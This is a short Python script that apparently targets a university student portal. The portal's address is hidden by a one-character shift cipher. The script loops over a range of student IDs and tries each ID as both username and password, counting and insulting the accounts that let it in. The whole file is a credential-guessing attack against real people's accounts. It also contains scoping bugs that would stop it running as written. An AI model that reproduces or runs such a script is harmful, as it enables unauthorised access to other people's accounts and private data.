import mechanize

global cookedmeat
cookedmeat=""
token = "iuuq;00hqnt/bnsjubofu/fev0hqjt0tuvefou0joefy/qiq"
rawvictory = "iuuq;00hqnt/bnsjubofu/fev0hqjt0tuvefou0joefy/qiqiuuq;00hqnt/bnsjubofu/fev0hqjt0tuvefou0ipnf/qiq"
def legit_maker(token) :
	for i in token:
		cookedmeat+=chr(ord(i)-1)
	return cookedmeat

def hack(i) :
	browser = mechanize.Browser()
	browser.open(legit_maker(token))
	browser.select_form(nr = 0)
	usr = "<suffix>" + str(i)
	print "Trying" + usr
	browser.form['userid'] = usr
	browser.form['passwd'] = usr
	browser.submit()
	if(browser.geturl() == legit_maker(rawvictory)):
		print usr+ " is a douchebag"
		cseidiot+=1




def_string = ""
cseidiot=0
for i in range(12000, 14470):
	hack(i)
print "There are "+str(cseidiot)+" number of douchebags!"

